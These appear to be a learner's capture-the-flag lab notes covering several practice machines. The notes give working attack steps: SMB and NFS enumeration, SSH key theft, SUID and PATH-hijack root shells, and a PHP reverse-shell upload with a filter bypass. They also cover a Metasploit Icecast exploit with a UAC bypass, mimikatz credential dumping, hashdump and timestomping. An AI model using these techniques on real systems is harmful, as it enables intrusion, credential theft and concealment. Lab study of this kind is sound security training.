
## Module-4 Enumeration

### NetworkServices

#### Task-3

```
nmap <IP> -vv
```

```
enum4linux <IP> -a
```


#### Task-4

We have username and share name provided in the question

```
smbclient //<IP>/secret -U suit -p 445
```

We are trying anonymous login here

After enumerating we will find a share name called profiles

![enum results](THM/Assets/1.png)

```
smbclient //<IP>/profiles -U Anonymous
```











## **Module-4 Enumeration**

### **Kenobi**

```
nmap -sC -sV IP
```

Let us try anonymous login using smb

```
smbclient //10.49.133.202/anonymous
```

We found a file called log.txt here

```
get log.txt
``` 

It helped us to get it but we found nothing good)

```
ncat 10.49.133.202 21
```

We found ProFTPD version 1.3.5

```
sudo mkdir -p /mnt/kenobiNFS
```

```
showmount -e 10.49.133.202
```

```
mount | grep kenobi
```

```
ls -la /mnt/kenobiNFS
```

```
sudo mount -t nfs 10.49.133.202:/var /mnt/kenobiNFS
```

```
cp /mnt/kenobiNFS/tmp/id_rsa .
```

```
sudo chmod 600 id_rsa
```

```
ssh -i id_rsa kenobi@10.49.133.202
```

We found first flag after login

##### **Privilege escalation**

```
find / -perm -u=s -type f 2>/dev/null
```

In the list we found /usr/bin/menu a different thing which we can misuse

```
/usr/bin/menu
```

```
strings /usr/bin/menu
```

```
cd /tmp
```

```
echo /bin/sh > curl
```

```
ls
```

```
chmod 777 curl
```

```
export PATH=/tmp:$PATH
```

```
/usr/bin/menu
```

```
1
```

```
whoami
```

##### Now we are root

```
cd ..
```

```
cd root
```

```
cat root.txt
```

## **Module-6 System Hacking**

### **Anthem**

```
nmap -sC -sV -Pn -vv IP
```

-vv Shows extra details

robots.txt - Found password

Umbraco is CMS that file is running

Anthem.com Domain

Paste poem in google we found admin name Solomon Grundy

John doe email was JD@anthem.com so for Solomon Grundy its JD

--------------------------------------------------------------------------------------------------------------------------

##### 1st Flag

We are hiring

##### 2nd Flag

inside- /categories

##### 3th Flag

We are hiring -> Author John doe

##### 4th Flag

cheers to IT department - page source

--------------------------------------------------------------------------------------------------------------------------

```
sudo apt update
```

```
sudo apt install freerdp3-x11
```

xfreerdp is new and rdesktop is old school RDP client

Most modern & actively maintained

1.     Supports modern RDP features:

2.     Network Level Authentication (NLA)

3.     TLS encryption

4.     CredSSP

5.     Smart cards

6.     Clipboard & drive redirection

7.     Multi-monitor setups

```
xfreerdp3 /v:<IP> /u:sg /p:UmbracoIsTheBest! /cert:ignore +clipboard /dynamic-resolution
```

/cert:ignore -> Ignore TLS certificate warnings

+clipboard -> Enable clipboard sharing

/dynamic-resolution -> Auto-resize the RDP session

Unhide files in C folder -> edit permissions

 ```
 xfreerdp3 /v:10.64.144.3 /u:Administrator /p:ChangeMeBaby1MoreTime /cert:ignore +clipboard /dynamic-resolution
 ```

## **Module-6 System Hacking**

### **RootMe**

```
nmap -sC -sV --vv <IP>
```

```
gobuster dir -u <url> -w <wordlist>
```

We found  /uploads and /panel

/Panel is hidden directory

##### **User.txt**

Let’s search in uploads file on the web

Panel has file upload option so we can use pentest monkey reverse shell

Change ip to yours in php reverse shell of pentest monkey and run netcat on your system

```
nc -lvnp <port>
```

Upload php file in it

We found that we are not able to enter php file directly

Change extension from php to php5

Now upload again

We were able to bypass that

Let’s go to /uploads folder as it is where we uploaded our file

Click on reverse shell over there

We got user access

```
find / -name user.txt
```

We found file inside /var/www/user.txt

**Privilege Escalation**

```
find / -user root -perm /4000 2>/dev/null
```

4000 à permission for SUID

2>/dev/null à Used to scrap results of permission denied ones

We can do something about

/usr/bin/python

Apart from /python one others are mostly there

Let’s go to gtfobins

Search python and click on suid

[https://gtfobins.github.io/gtfobins/python/#suid](https://gtfobins.github.io/gtfobins/python/#suid)

```
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

/usr/bin is where the python is there

Now we are root and we can cat out root flag

## **Module-6 System Hacking**

### **Ice**

```
nmap -sV -p8000 10.48.129.48
```

```
nmap -sC -sV -Pn -vv 10.48.129.48
```

```
nmap -sS <IP>
```

On port 3389 we found a vulnerable thing

In CVE details we found vulnerability ICE-cast

```
nmap -T4 -p- --script=vuln -vv 10.48.129.48
```

search icecast in CVE score (we found vuln cve2014-3704 in port 8000)

CVE-2004-1561

But its vulnerability exploit is

Run msfconsole

exploit/windows/http/icecast_header

options

set RHOSTS <IP>

ifconfig

copy tun0 ip

set LHOST IP (your IP from tun0)

run

We entered into the machine

Now use ps to check running processes

We saw icecast2.exe was running in dark pc

sysinfo

gets us system info

run post/multi/recon/local_exploit_suggester

Once it completes, it provides us a list of exploits for privilege escalation

For this we will be using this exploit

exploit/windows/local/bypassuac_eventvwr

Now we will go a step back by Ctrl + Z

use exploit/windows/local/bypassuac_eventvwr

Now we gotta view sessions number so type session for it

set Session 1

Now change LHOST to tun0 IP

exploit

To verify our new privileges type

getprivs

ps

Now we will look for a process with NT\ Authority and can help us

So, for this we will use spoolsv.exe

Now to migrate to that use

migrate -N spoolsv.exe

Now check for user

getuid

Now we gotta use mimikatz to dump passwords

load kiwi

Now to check which options are available

help

Now to get all credentials

creds_all

Now to drop all passwords in hashes

hashdump

For screen record

screenshare

For microphone record

record_mic

To change timestamp of files

timestomp